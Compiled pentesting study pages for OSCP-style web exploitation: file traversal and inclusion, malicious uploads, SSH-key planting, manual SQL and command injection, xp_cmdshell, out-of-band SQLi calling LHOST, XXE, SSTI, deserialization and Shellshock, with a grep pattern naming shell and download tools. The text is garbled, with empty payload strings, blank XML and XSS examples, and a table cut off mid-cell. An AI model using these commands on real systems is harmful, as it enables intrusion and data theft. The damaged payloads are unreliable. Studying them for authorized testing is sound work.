pages.markdown:
# Web File Read, Inclusion and Upload Paths [← Stage index](README.md) · [Web mapping](../02-service-enumeration/10-http-web-mapping.md) · [Quick sheet](../../cheatsheets/web-exploitation.md#file-paths-and-uploads) · [Mechanics](../../notes/Master_Notes.md#file-handling-primitives) | [Strategy map](../../notes/Attack_Strategy_Map.md) | Study methods: [Turn application weaknesses into access](../../notes/methods/web-exploitation.md) > **Use when:** a request selects, includes, downloads, previews or uploads a file. Prove read, inclusion, write and execution separately. ## Directory traversal: prove file read Linux proof: ```bash curl -skG --data-urlencode 'file=../../../../../../etc/passwd' http://TARGET:PORT/PATH ``` Windows proof: ```bash curl -skG --data-urlencode 'file=../../../../../../Windows/System32/drivers/etc/hosts' http://TARGET:PORT/PATH ``` > **Decisive output:** recognizable contents of the requested target file. `200 OK`, a changed template or a filename reflected in an error is not proof.
Variant — traversal occurs in the URL path ```bash curl -sk --path-as-is 'http://TARGET:PORT/static/../../../../etc/passwd' ``` `--path-as-is` prevents curl from collapsing `..` before sending the request.
Variant — basic normalization/filter tests ```text ..%2f..%2f..%2fetc%2fpasswd %2e%2e/%2e%2e/%2e%2e/etc/passwd ....//....//....//etc/passwd ``` Try these only after a plain baseline. Preserve the exact decoding layer that accepted the value.
> **Next:** use discovered user homes, application paths and configuration names to retrieve relevant source, keys or credentials. Send recovered authentication material to Block 5 with its source and identity context. ## PHP inclusion: retrieve source ```bash curl -skG --data-urlencode 'page=php://filter/convert.base64-encode/resource=index.php' http://TARGET:PORT/index.php printf '%s' 'BASE64_DATA' | base64 -d ``` > **Prerequisite:** a PHP file-inclusion sink that accepts the wrapper. The encoded output must decode to target source; a normal rendered page means the wrapper did not disclose source in that context. ## LFI to command execution through a writable/readable log ```bash curl -sk -A '' http://TARGET:PORT/ curl -skG --data-urlencode 'page=/var/log/apache2/access.log' --data-urlencode 'cmd=id' http://TARGET:PORT/index.php ``` > **Prerequisites:** the controlled header is logged, the web identity can read the exact log, the inclusion sink evaluates PHP and the payload survives encoding. On Windows/XAMPP, investigate application-specific paths such as `C:\xampp\apache\logs\access.log`. > **Decisive output:** the unique command output and target execution identity. If code appears as text, only read/inclusion is proven.
Variant — PHP data wrapper ```bash PAYLOAD=$(printf '%s' '' | base64 -w0) curl -skG --data-urlencode "page=data://text/plain;base64,$PAYLOAD" --data-urlencode 'cmd=id' http://TARGET:PORT/index.php ``` Requires URL inclusion in the sink and PHP `allow_url_include=On`; it is disabled by default in current PHP configurations.
Variant — remote file inclusion ```bash python3 -m http.server TRANSFER_PORT --bind LHOST curl -skG --data-urlencode 'page=http://LHOST:TRANSFER_PORT/check.php' --data-urlencode 'cmd=id' http://TARGET:PORT/index.php ``` Requires remote URL inclusion, a compatible interpreter and target-to-`LHOST:TRANSFER_PORT` reachability. An absent HTTP request is inconclusive until reachability and filtering are separated.
## Upload: establish the primitive Create and upload a benign canary: ```bash printf '%s\n' 'UPLOAD_CANARY_7F31' > probe.txt curl -sk -b cookies.txt -F 'file=@probe.txt;filename=probe.txt;type=text/plain' http://TARGET:PORT/upload ``` Then verify the returned identifier/path and retrieve the bytes. > **Record separately:** acceptance, server-side name, storage path, retrieval URL, response content type, filesystem write identity and whether the storage location is executable. ## Upload: verify executable handling PHP example, only after PHP handler evidence: ```bash printf '%s\n' '' > check.php curl -sk -b cookies.txt -F 'file=@check.php;filename=check.php;type=application/x-php' http://TARGET:PORT/upload curl -skG --data-urlencode 'cmd=id' http://TARGET:PORT/uploads/check.php ``` > **Decisive output:** target command output. A successful upload that downloads, displays source or returns inert text proves write/retrieval only.
Variants — isolate validation layers in Burp Repeater Test one property at a time: - bypass client-side checks by replaying the raw multipart request; - filename case or alternate extension only when the observed server maps it to the interpreter; - multipart `Content-Type` independently from filename and content; - magic bytes only when server behavior shows content inspection; - double extensions/trailing characters only when normalization evidence supports them; - server rename and final response `Content-Type`. ```bash curl -sk -b cookies.txt -F 'file=@check.php;filename=check.pHP;type=image/jpeg' http://TARGET:PORT/upload ``` Changing MIME type is a test of validation, not proof of executable handling.
## Upload with path control First use a harmless unique filename outside the normal upload directory and verify it through a separate read/listing primitive. Do not overwrite an existing file as a detection test.
Lab-only variant — controlled SSH public-key placement ```bash ssh-keygen -t ed25519 -f ./web_upload_key -N '' cp ./web_upload_key.pub ./authorized_keys curl -sk -b cookies.txt -F 'file=@authorized_keys;filename=../../../../home/USER/.ssh/authorized_keys' http://TARGET:PORT/upload ssh -i ./web_upload_key -p SSH_PORT USER@TARGET ``` Use only in a disposable authorized lab after confirming the exact user/home, SSH service, web write identity, destination semantics and overwrite impact. Failure can mean path normalization, permission denial, SSH policy or a different user—not necessarily that upload path control is absent.
## Exit and next action - file/source/credential disclosure -> Block 5 and authenticated re-enumeration; - verified web command execution -> record `whoami`/`id`, hostname and working directory, then Block 7; - write without execution -> identify the privileged consumer/trigger or retain it as a chain primitive; - product-specific handler/CVE requirement -> Block 6; - no decisive result -> return to the [web behavior map](../02-service-enumeration/10-http-web-mapping.md) with the exact disproven context. ## PHP include control — generate a filter chain when uploads are unavailable Use only after confirming a PHP `include`/`require` sink accepts a fully controlled stream URI. A file-read endpoint that returns bytes without evaluating PHP is a different primitive. The required iconv/filter behavior must be present. ```bash # Generate the chain locally; copy the complete URI from its output python3 php_filter_chain_generator.py --chain '' # Replay the actual inclusion parameter, encoding the URI as one value curl -sS -G --data-urlencode 'page=FILTER_URI' http://TARGET:PORT/PATH ``` Read: an attributable target UID proves execution; base64-looking text alone can simply be source/file disclosure. Filter errors, URI truncation or rejected wrappers → inspect the actual PHP build, filter availability and parameter limits. Use the existing upload/log inclusion routes when their prerequisites fit; do not assume a modern `%00` suffix truncates a filename. Sources: [upstream 1](https://github.com/synacktiv/php_filter_chain_generator). ## Image/PDF upload plus inclusion — verify the consumer Use when an accepted upload can later be read by a confirmed PHP include sink. MIME, extension and magic-byte checks only describe acceptance; they do not establish an executable handler. ```bash # Start with an existing valid test JPEG; place a small PHP effect in its metadata exiftool -Comment='' probe.jpg file probe.jpg # Retrieve the stored upload, then use the verified inclusion path curl -i http://TARGET:PORT/uploads/STORED_FILE curl -sS -G --data-urlencode 'page=PATH/TO/STORED_FILE' http://TARGET:PORT/INCLUDE_PATH ``` Read: downloading image bytes is storage/read access; a UID returned by the include establishes execution in that PHP process. PDF/PHP combinations have the same consumer requirement. Extension case, double extensions and Content-Type changes are separate validation tests, not a list to try blindly. Treat null-byte filenames as a legacy parser hypothesis that needs version evidence. Sources: [upstream 1](https://exiftool.org/) · [upstream 2](https://www.php.net/manual/en/function.include.php). ## Sources Supplied PEN-200 Ch 9.1-9.3, pp245-274; [Hexdump traversal module](https://github.com/LeonardoE95/OSCP/tree/main/modules/web/04-directory-traversal), [file inclusion](https://github.com/LeonardoE95/OSCP/tree/main/modules/web/05-file-inclusion), [file upload](https://github.com/LeonardoE95/OSCP/tree/main/modules/web/06-file-upload-vulnerabilities); [OWASP traversal/file inclusion](https://wstg.owasp.org/latest/4-Web_Application_Security_Testing/05-Authorization/01-Directory_Traversal_File_Include/).

# Command and Manual SQL Injection [← Stage index](README.md) · [Web mapping](../02-service-enumeration/10-http-web-mapping.md) · [Quick sheet](../../cheatsheets/web-exploitation.md#command-injection) · [Mechanics](../../notes/Master_Notes.md#injection-primitives) | [Strategy map](../../notes/Attack_Strategy_Map.md) | Study methods: [Turn application weaknesses into access](../../notes/methods/web-exploitation.md) > **Use when:** mapped application behavior suggests attacker input reaches an operating-system command or database query. Preserve a valid baseline, change one input at a time and prove each capability separately. ## Operating-system command injection ### Visible-output baseline Start with a benign identity marker appropriate to the inferred operating system: ```bash curl -skG --data-urlencode 'host=127.0.0.1;id' http://TARGET:PORT/PATH curl -skG --data-urlencode 'host=127.0.0.1&whoami' http://TARGET:PORT/PATH ``` > **Decisive output:** command output attributable to the target, such as a username/UID that is absent from the normal response. Reflection of the payload is not execution.
Variants — separators, quoting and POST bodies Test only the forms compatible with the observed command and platform: ```text 127.0.0.1; id 127.0.0.1 && id 127.0.0.1 | id 127.0.0.1%0aid ``` ```bash curl -sk -X POST -H 'Content-Type: application/x-www-form-urlencoded' --data-urlencode 'host=127.0.0.1;id' http://TARGET:PORT/PATH curl -sk -X POST -H 'Content-Type: application/json' -d '{"host":"127.0.0.1;id"}' http://TARGET:PORT/api/PATH ``` For Windows command contexts, use an observed `cmd.exe` or PowerShell boundary before choosing syntax: ```text 127.0.0.1 & whoami 127.0.0.1 | whoami ```
### Blind timing proof Repeat a control and a bounded-delay request several times: ```bash curl -sk -o /dev/null -w 'control=%{time_total}\n' -G --data-urlencode 'host=127.0.0.1' http://TARGET:PORT/PATH curl -sk -o /dev/null -w 'test=%{time_total}\n' -G --data-urlencode 'host=127.0.0.1;sleep 5' http://TARGET:PORT/PATH ``` Windows candidate after platform evidence: ```text 127.0.0.1 & timeout /t 5 ``` > **Decisive output:** a repeatable delay near the chosen interval relative to multiple controls. One slow response is inconclusive. ### After command execution ```text Linux: id; hostname; pwd Windows: whoami; hostname; cd ``` Record the execution identity, working directory, shell/parser and egress assumptions. Hand reliable-session work to Block 7; do not treat one command response as an interactive shell. ## Manual SQL injection workflow > **Exam boundary:** the current OSCP+ exam guide prohibits SQLmap and other automatic exploitation tools. The following procedure is manual. Recheck the current guide before an exam. ### 1. Establish query influence Replay a valid request in Burp Repeater. Change one parameter and compare a normal value, quote, true condition and false condition: ```text VALUE VALUE' VALUE' AND '1'='1 VALUE' AND '1'='2 ``` For a numeric context: ```text 1 1 AND 1=1 1 AND 1=2 ``` > **Evidence:** a database error, stable true/false response difference, or repeatable database-specific delay. An isolated `500`, WAF block or generic application error is not enough. ### 2. Authentication-bypass candidate In an authorized disposable lab, preserve the application's quoting and comment syntax: ```text ' OR 1=1-- - administrator'-- - ``` > **Verification:** identify the resulting account/session and perform a separate authorized request. A redirect or welcome string alone can be misleading. ### 3. Determine UNION shape First establish column count: ```text ' ORDER BY 1-- - ' ORDER BY 2-- - ' ORDER BY 3-- - ``` Or increment `NULL` columns until the query succeeds: ```text ' UNION SELECT NULL-- - ' UNION SELECT NULL,NULL-- - ' UNION SELECT NULL,NULL,NULL-- - ``` Then find a displayed text-compatible column: ```text ' UNION SELECT NULL,'MARKER_7F31',NULL-- - ``` > **Decisive output:** the marker appears in a response location controlled by the injected row. Match the exact column count and data types. ### 4. Extract only after fingerprinting the DBMS ```text MySQL: ' UNION SELECT NULL,version(),NULL-- - PostgreSQL: ' UNION SELECT NULL,version(),NULL-- - MSSQL: ' UNION SELECT NULL,@@version,NULL-- - ``` Use the confirmed DBMS's catalog and concatenation syntax rather than cycling unrelated payloads. Keep each extraction request reproducible in Repeater. ### 5. Boolean- or time-blind extraction Choose a stable page marker or content length for true/false comparisons: ```text ' AND SUBSTRING((SELECT version()),1,1)='P'-- - ' AND SUBSTRING((SELECT version()),1,1)='X'-- - ``` DBMS-specific time proofs: ```text MySQL: ' AND IF(1=1,SLEEP(5),0)-- - PostgreSQL: '; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END-- MSSQL: '; IF (1=1) WAITFOR DELAY '0:0:5'-- ``` > Repeat controls. Time-based results are invalid if application latency overlaps the chosen delay or the condition cannot be changed independently. ## Database control to operating-system effect This is a new transition, not an automatic consequence of SQL injection. Verify the DBMS identity, database role, feature state, filesystem permissions and path or egress assumptions first.
MSSQL — xp_cmdshell when privilege and policy allow ```sql EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; EXEC xp_cmdshell 'whoami'; ``` Requires sufficient server privilege; enabling it changes server configuration. Prefer a direct proof when it is already enabled. Verify the Windows service identity returned by `whoami`.
PostgreSQL — COPY PROGRAM when role and version allow ```sql DROP TABLE IF EXISTS cmd_output; CREATE TABLE cmd_output(line text); COPY cmd_output FROM PROGRAM 'id'; SELECT * FROM cmd_output; ``` Requires a superuser or a role such as `pg_execute_server_program`; the command runs under the database service account.
MySQL/MariaDB — file write as a separate primitive ```sql SELECT '' INTO OUTFILE '/CONFIRMED/WEBROOT/check.php'; ``` Requires `FILE` privilege, a permitted `secure_file_priv` destination, a known writable webroot and PHP execution there. Verify the file through HTTP, then verify execution. If it only displays or downloads, only file write is proven.
## Out-of-band SQL injection boundary Out-of-band testing is relevant only when direct content, errors, boolean differences and repeatable time delays cannot produce decisive evidence and the database can initiate a network request. A callback proves server/database-side resolution or connectivity; it does not by itself prove arbitrary query-result extraction. Hypothetical MySQL/Windows UNC lookup in an authorized lab: ```sql SELECT LOAD_FILE(CONCAT('\\\\LHOST\\', DATABASE())); ``` Use a uniquely labelled controlled listener/domain and transmit no sensitive row data during proof. Required conditions include a DBMS/function that performs the lookup, sufficient database/OS permissions, working outbound DNS/SMB/HTTP as applicable and an observable callback. No callback is inconclusive until query execution and outbound reachability are separated. Avoid poisoning/spoofing; the current OSCP+ exam guide prohibits spoofing. ## Failure-guided decisions - quote causes generic error only -> compare true/false and inspect whether the application, proxy or WAF generated it; - `UNION` always errors -> recheck context, column count, types, parentheses and comment syntax; - blind pages differ randomly -> find a stable marker or repeat timing controls before continuing; - command payload is reflected -> no execution proof; compare command-derived output or side effect; - command executes but callback fails -> keep execution confirmed and diagnose listener, route, payload and egress separately in Block 7; - database identity lacks the required role/feature -> retain data access and search extracted configuration/credentials rather than assuming OS execution. ## Handoffs - extracted password/hash/key/token -> Block 5 with source and identity context; - exact vulnerable product/version or stored procedure requirement -> Block 6; - verified OS command -> Block 7 session handling; - file write into web content -> [web file handling](02-web-file-handling.md); - useful application account/role -> remap authenticated behavior in Block 3. ## SSTI — prove template evaluation, then identify the engine Use when controlled text appears inside a server-rendered template, email preview or report. Replay the real parameter and session. These are separate probes, not one universal payload: ```bash # Jinja/Twig-style expression probe curl -sS -G --data-urlencode 'name={{7*7}}' http://TARGET:PORT/PATH # A different delimiter family, only when the first is literal or errors suggest it curl -sS -G --data-urlencode 'name=${7*7}' http://TARGET:PORT/PATH # Jinja-versus-Twig clue; interpret alongside source/errors, not in isolation curl -sS -G --data-urlencode "name={{7*'7'}}" http://TARGET:PORT/PATH ``` Read: changed, repeatable computed output compared with a literal control supports evaluation. `49` alone does not identify the engine. Jinja commonly repeats the string; Twig commonly treats it numerically. Confirm the engine/version and exposed objects before selecting a file-read or command primitive. Literal reflection → inspect another template/input boundary; a syntax error alone does not prove an exploitable expression. Sources: [upstream 1](https://portswigger.net/web-security/server-side-template-injection). ## XXE — test the XML parser and file-read result Use a working XML request and put the entity reference in a field whose parsed value is returned. Retain the original wrapper, cookies and endpoint. Example body for an XML-compatible endpoint: ```xml ]> &probe; ``` ```bash curl -i -b cookies.txt -H 'Content-Type: application/xml' \ --data-binary @xxe.xml http://TARGET:PORT/PATH ``` Read: recognizable file content in the parsed field proves read access; echoing the submitted XML does not. Choose a platform-appropriate file; Windows can use `file:///C:/Windows/win.ini`. DTD rejection or unresolved entities → check the parser's actual configuration, not more traversal depth. If the application builds XML around your input and processes XInclude, a separate condition can exist without control over the document's DOCTYPE: ```xml ``` A blind endpoint needs an observable parser/network effect before any exfiltration claim. Follow verified config/source reads into credential or application testing. Sources: [upstream 1](https://portswigger.net/web-security/xxe). ## NoSQL operator injection — separate JSON objects from strings Use when a login/search accepts structured JSON or nested form parameters and evidence suggests a MongoDB-style query. Start with a normal failed request, then change one value's type. ```bash # A known username with an operator-valued password curl -i -c cookies.txt -H 'Content-Type: application/json' \ --data '{"username":"USER","password":{"$ne":""}}' http://TARGET:PORT/LOGIN # Distinct context: a form parser that expands bracketed properties curl -i -c cookies.txt --data-urlencode 'username=USER' \ --data-urlencode 'password[$ne]=x' http://TARGET:PORT/LOGIN ``` Read: compare against the same operator encoded as a plain string and against a known wrong password. Confirm the resulting identity through a protected route. A 200/login page or changed error is not authenticated access. Type validation, hashing the supplied password before querying, or removal of `$` operators can rule out this route. Broader `$ne` username queries may select an unexpected first account; keep the intended identity explicit. Sources: [upstream 1](https://portswigger.net/web-security/nosql-injection). ## PHP deserialization — match the gadget to installed dependencies Use when a controlled serialized value reaches unsafe `unserialize()` and the required classes are loaded. Identify dependencies/builds from source or `composer.lock` first. ```bash # Inspect available families and the exact chain's version/vector requirements phpggc -l phpggc -i Monolog/RCE1 # Example function-call gadget, only when that chain matches the application phpggc -b Monolog/RCE1 system id > payload.b64 ``` Read: base64 is a transport choice, not a bypass—the sink must decode it before deserialization. Preserve raw serialized lengths and binary bytes; use the encoding that the real request expects. A generated payload is not execution proof. Missing classes, rejected object types or a different dependency version → choose a matching chain or another primitive. Verify a benign effect before selecting a shell payload. Sources: [upstream 1](https://github.com/ambionics/phpggc). ## Unsafe YAML construction — distinguish loading from safe parsing Use when source or errors identify Python YAML processing with an unsafe loader and you control the loaded YAML. An ordinary JSON field or `yaml.safe_load()` does not supply this condition. ```yaml !!python/object/apply:os.system ["id"] ``` Put the probe in the actual YAML input/file, preserving its required surrounding structure. Read: attributable command output/effect supports unsafe construction. `ConstructorError` for the Python tag commonly indicates a loader that does not permit that constructor. Confirm the installed PyYAML version and loader (`UnsafeLoader`/unsafe load), rather than assuming that any use of YAML permits Python object execution. Sources: [upstream 1](https://github.com/yaml/pyyaml). ## SQL truncation or normalization mismatch at registration Use when the application checks one representation for uniqueness but the DB stores or compares a different one—for example, an overlong username in a fixed-length column. Validate with a disposable account first. ```sql -- With SQL visibility, inspect the real column and strict-mode behavior SELECT @@sql_mode; SELECT COLUMN_NAME, CHARACTER_MAXIMUM_LENGTH FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = 'users'; ``` Compare registration/login behavior for the test name, its trailing-space form and an overlong form that would truncate to it. A plus character only becomes a space in the appropriate form encoding; it is not a universal SQL payload. A strict length error or a unique constraint on the normalized stored value can stop this path. Confirm an actual account/authorization change before calling it a bypass. Sources: [upstream 1](https://dev.mysql.com/doc/refman/8.4/en/sql-mode.html). ## Shellshock candidate — only for a CGI path that invokes vulnerable Bash Use when a confirmed CGI endpoint passes HTTP-derived environment variables into an affected Bash process. An arbitrary PHP/Java route or a Bash version string alone does not establish this chain. ```bash # Bounded command-effect probe at the actual CGI script curl -i -H 'User-Agent: () { :;}; echo; /usr/bin/id' \ http://TARGET:PORT/cgi-bin/SCRIPT ``` Read: an attributable UID in the executed CGI response supports the effect; reflection of the header text does not. Header/CGI parsing errors require inspecting the request and script behavior. No effect → re-check the actual component and patch status before selecting another PoC. This is the CVE-2014-6271 family, not a generic command separator for every web input. Sources: [upstream 1](https://nvd.nist.gov/vuln/detail/CVE-2014-6271). ## Sources Supplied PEN-200 Ch 9.4 pp274-279 and Ch 10 pp285-300; reviewed [getSH Web/SQLi route](https://lizajose.github.io/getSH/web); [Hexdump SQL injection module](https://github.com/LeonardoE95/OSCP/tree/main/modules/web/03-sql-injection); [OWASP command injection testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/12-Testing_for_Command_Injection), [OWASP SQL injection testing](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection); current [OSCP+ exam guide](https://help.offsec.com/hc/en-us/articles/360040165632-OSCP-Exam-Guide).

# Web Access Control, API Logic and XSS [← Stage index](README.md) · [Web mapping](../02-service-enumeration/10-http-web-mapping.md) · [Quick sheet](../../cheatsheets/web-exploitation.md#access-control-and-xss) · [Mechanics](../../notes/Master_Notes.md#authorization-and-browser-context) | [Strategy map](../../notes/Attack_Strategy_Map.md) | Study methods: [Turn application weaknesses into access](../../notes/methods/web-exploitation.md) > **Use when:** the mapped application exposes object identifiers, roles/properties, privileged functions or user-controlled content rendered in a browser. ## Object-level authorization / IDOR Use two controlled lab identities and one object owned by each: ```http GET /api/orders/OBJECT_B HTTP/1.1 Host: DOMAIN Authorization: Bearer USER_A_TOKEN ``` 1. Save user A's successful request for object A. 2. Change only the path/query/body object reference to object B. 3. Keep A's token. 4. Verify disclosure or the intended update/delete effect against B's object. > **Decisive output:** data or a state change belonging to B under A's context. A different error or `200` wrapper is not enough. ## Function- and role-level authorization Replay the same operation as: ```text anonymous -> ordinary user -> alternate ordinary user -> administrator ``` Compare UI and API paths, then test the legitimate method variants suggested by captured traffic or documentation. ```bash curl -ski -b user-a.cookies http://TARGET:PORT/admin/PATH curl -ski -X POST -b user-a.cookies -H 'Content-Type: application/json' -d '{"action":"EXPECTED_ACTION"}' http://TARGET:PORT/api/admin/PATH ``` > **Failure cue:** a route name containing `admin` does not establish a bypass. Verify a privileged read or action under the lower-privileged identity. ## Mass assignment / excessive properties Start with a valid captured registration/update request and add one server-owned property: ```bash curl -ski -X POST -H 'Content-Type: application/json' -d '{"username":"TEST_USER","password":"TEST_PASSWORD","role":"administrator"}' http://TARGET:PORT/api/v1/register ``` > **Decisive output:** authenticate as the new/updated identity and perform an administrator-only action. An echoed or stored `role` field may be ignored by authorization logic.
Variant — method mismatch reveals a valid route ```bash curl -ski http://TARGET:PORT/api/v1/users/USER/password curl -ski -X OPTIONS http://TARGET:PORT/api/v1/users/USER/password curl -ski -X PUT -H 'Authorization: Bearer TOKEN' -H 'Content-Type: application/json' -d '{"password":"NEW_PASSWORD"}' http://TARGET:PORT/api/v1/users/USER/password ``` Use PUT/PATCH only when a `405`, `Allow` header, documentation or JavaScript behavior supports it. Verify the new credential through a separate login.
## XSS: prove browser execution in the right context First inject a unique text marker and inspect where it appears in raw HTML and the DOM. Then use a controlled proof appropriate to the context: ```html ``` Classify the path: - reflected: victim must visit a crafted request; - stored: payload persists and a relevant user later renders it; - DOM-based: client-side code moves controlled data into an executable DOM sink. > **Decisive output:** JavaScript executes under the expected application origin and viewer context. Reflection or HTML display alone is not XSS. Match the proof to the observed parser context rather than trying a random payload list: | Observed insertion context | Minimal lab proof candidate | What failure means | | --- | --- | --- | | HTML element body | `

# WordPress and SSRF Paths [← Stage index](README.md) | [HTTP mapping](../02-service-enumeration/10-http-web-mapping.md) | [Web cheatsheet](../../cheatsheets/web-exploitation.md) | [Strategy map](../../notes/Attack_Strategy_Map.md) | Study methods: [Turn application weaknesses into access](../../notes/methods/web-exploitation.md) ## WordPress: establish the deployment first > **Recognition:** WordPress-specific paths/assets, generator metadata, REST routes or `wp-content`. **Prerequisite:** correct scheme, host header and base path. **Decisive output:** core/plugin/theme identity or an authenticated capability that maps to a concrete prerequisite. ```bash curl -skI https://HOSTNAME/ curl -sk https://HOSTNAME/robots.txt curl -sk https://HOSTNAME/wp-json/ | head curl -sk https://HOSTNAME/wp-content/ curl -sk https://HOSTNAME/wp-login.php -o wp-login.html ``` Inspect page source for `/wp-content/plugins/NAME/`, `/wp-content/themes/NAME/`, versioned assets and alternate base paths. A visible version is a candidate, not exploitability proof.
WPScan inventory ```bash wpscan --url https://HOSTNAME/ --disable-tls-checks \ --enumerate vp,vt,u --plugins-detection mixed \ --output wpscan-HOSTNAME.txt ``` > WPScan can be useful for component/user candidates, but verify every useful result manually. Vulnerability-database details may require an API token; never place a token in published notes or command history.
## WordPress authentication and post-authentication mapping Validate one legitimately acquired credential and then enumerate the role/capabilities it actually grants. ```bash curl -sk -c wp.cookies -b wp.cookies \ --data-urlencode 'log=USER' \ --data-urlencode 'pwd=PASSWORD' \ --data-urlencode 'wp-submit=Log In' \ --data-urlencode 'redirect_to=https://HOSTNAME/wp-admin/' \ https://HOSTNAME/wp-login.php -D wp-login.headers curl -sk -b wp.cookies https://HOSTNAME/wp-admin/ -o wp-admin.html ``` > A redirect alone is inconclusive. Confirm an authenticated page marker and the actual role. Useful capabilities can include media upload, plugin/theme editing/installation, post editing or administrative account management; each requires separate server-side authorization and execution conditions. XML-RPC exposure is a feature clue, not automatically a vulnerability: ```bash curl -sk -X POST https://HOSTNAME/xmlrpc.php \ -H 'Content-Type: text/xml' \ --data 'system.listMethods' ``` ## SSRF: prove server-side fetching safely > **Recognition:** URL import, webhook, image/PDF fetch, feed preview, link unfurling or callback validation. **Prerequisite:** a parameter that the server dereferences. **Decisive output:** a request observed at a controlled listener or a stable response difference tied to the destination. Listener: ```bash python3 -m http.server LPORT --bind 0.0.0.0 ``` Hypothetical request replay: ```bash curl -sk 'https://HOSTNAME/fetch?url=http://LHOST:LPORT/ssrf-marker' ``` Interpret the path explicitly: ```text browser/client -> vulnerable application -> requested URL ``` The application, not Kali, must resolve and reach the destination. A browser-side fetch, open redirect or reflected URL does not prove SSRF.
Internal destination and parser variations ```bash # Only after an external controlled callback proves server-side fetching curl -sk 'https://HOSTNAME/fetch?url=http://127.0.0.1:PORT/' curl -sk 'https://HOSTNAME/fetch?url=http://localhost:PORT/' # Preserve encoding when the URL is nested in form data curl -sk -X POST https://HOSTNAME/fetch \ --data-urlencode 'url=http://127.0.0.1:PORT/' ``` > Compare status, body marker, size and timing against a closed-port control. Internal HTTP content establishes reachability/read capability, not command execution.
## Failure-guided routing - Callback never arrives: verify the parameter is fetched server-side, the listener address, return route, URL parser and allowed schemes. - External callback works but loopback fails: destination filtering, container/network namespace or application proxying may differ. - All internal ports look identical: the application may normalize errors; use a known-open/known-closed comparison and stable markers. - Redirect accepted but final destination blocked: determine whether validation happens before or after redirects without assuming a bypass. - WordPress scanner finds a component but the path/version is absent: manually confirm the active component and vulnerable configuration. ## Sources - [getSH Web route](https://lizajose.github.io/getSH/web), source snapshot [`e1f62dd`](https://github.com/lizajose/getSH/commit/e1f62dd351bd061b59e2573beea741f6c5bb4f98) - [WPScan project documentation](https://github.com/wpscanteam/wpscan) - [PortSwigger SSRF overview](https://portswigger.net/web-security/ssrf) - [Hexdump web modules](https://github.com/LeonardoE95/OSCP/tree/main/modules/web)

# Public Exploit Selection and Adaptation [← Stage index](README.md) | [Shell/session procedure](../04-shells-transfers-credentials/02-shells-and-payloads.md) | [Quick sheet](../../cheatsheets/public-exploits.md) | [Strategy map](../../notes/Attack_Strategy_Map.md) | Study methods: [Select and adapt public exploits](../../notes/methods/public-exploits.md); [Establish sessions and move files](../../notes/methods/sessions-transfers.md) > **Purpose:** turn exact product/configuration evidence into a reviewed, minimally modified exploit that proves the intended effect. A version string or CVE match is only a candidate. ## Record the candidate ```text source URL/EDB-ID/CVE/commit: product + component + edition/build: target OS/architecture/runtime: remote or local; pre-auth or authenticated: required configuration/feature/path/credential/privilege: expected effect: exploit runtime and dependencies: hard-coded target/callback/payload assumptions: destructive or stability risk: evidence each prerequisite exists: ``` Do not substitute a scanner label for component evidence. Check vendor/version output, application behavior, files/configuration and the exploit's own affected-version notes. Distribution backports, disabled features, authentication and mitigations can invalidate a simple version match. ## Search narrowly ```bash searchsploit --cve CVE searchsploit -t "PRODUCT VERSION" searchsploit PRODUCT VERSION --exclude="/dos/" ``` Inspect before copying: ```bash searchsploit -p EDB_ID searchsploit -x EDB_ID searchsploit -w "PRODUCT VERSION" ``` Copy a working copy, never edit the archive in place: ```bash mkdir -p exploit-work cd exploit-work searchsploit -m EDB_ID sha256sum EXPLOIT_FILE file EXPLOIT_FILE ``` > **Selection cue:** prefer a readable, reputable or verified exploit whose prerequisites and outcome match the observed component. Exclude denial-of-service entries when the objective is access. A named Nmap NSE script can validate or exercise a specific known condition, but inspect it and its arguments first: ```bash nmap --script-help SCRIPT_NAME sed -n '1,240p' /usr/share/nmap/scripts/SCRIPT_NAME.nse nmap -Pn -p PORT --script SCRIPT_NAME --script-args 'ARG=VALUE' TARGET ``` Script categories such as `intrusive`, `exploit`, `brute` or `dos` change risk and authorization requirements. A script-reported vulnerable result remains a candidate until its underlying evidence or controlled effect is validated.
Variant — source repository rather than Exploit-DB Record and pin the exact source state: ```bash git clone REPOSITORY_URL exploit-source cd exploit-source git log -1 --format='%H %ad %s' --date=iso-strict git status --short ``` Read the README, license, dependency files, open issues relevant to the target version and the actual execution path. A popular repository is not automatically safe or compatible.
Variant — a matching Metasploit exploit module Use only in an authorized lab or after committing the current exam's one allowed Metasploit/Meterpreter target. Even `check` against a target consumes that choice under the current guide. ```text msfconsole -q search type:exploit PRODUCT CVE info MODULE_NAME use MODULE_NAME show options show targets show payloads set RHOSTS TARGET set RPORT PORT set TARGET TARGET_ID set PAYLOAD PAYLOAD_NAME set LHOST LHOST set LPORT LPORT check run ``` Read `info`, verify the module's affected versions/references, select the explicit target profile and inspect every required option. A module rank or `check` result does not replace exact prerequisite validation or session verification.
## Audit untrusted code before execution Start with metadata and readable text: ```bash file EXPLOIT_FILE sha256sum EXPLOIT_FILE sed -n '1,240p' EXPLOIT_FILE grep -nEi 'sudo|setuid|chmod|chown|rm |unlink|remove|subprocess|system\(|popen|exec\(|socket|connect|requests|curl|wget|powershell|cmd\.exe|/bin/(ba)?sh|http://|https://' EXPLOIT_FILE ``` For binaries, prefer obtaining inspectable source. If only a binary exists, treat it as a substantially higher-risk choice: ```bash file EXPLOIT_BINARY sha256sum EXPLOIT_BINARY strings -a EXPLOIT_BINARY | less objdump -f EXPLOIT_BINARY ``` Audit for: - unexpected privilege requirements on the attacking host; - destructive file/process/service operations or denial of service; - downloads, callbacks or telemetry to third parties; - embedded credentials, tokens, commands or payloads; - files written or overwritten and their cleanup behavior; - hard-coded target addresses, ports, paths, virtual hosts and callback values; - authentication, cookie, CSRF, redirect, TLS and proxy assumptions; - target OS, architecture, runtime, library and payload assumptions; - success messages that are printed without verifying the claimed effect. > **Safety cue:** use source, a disposable environment and a clean snapshot when uncertainty remains. Do not grant `sudo` merely because an unknown PoC requests it. ## Establish the runtime before changing code ```bash head -n 1 EXPLOIT_FILE python3 --version gcc --version file EXPLOIT_FILE ``` Separate three architectures: 1. where the exploit program itself runs; 2. the vulnerable target process; 3. the payload that will execute inside or on the target. A remote Python exploit may run on Kali while delivering a Windows x64 payload. A local Linux exploit normally must run on the target-compatible architecture. Compiler choice follows the produced program; payload 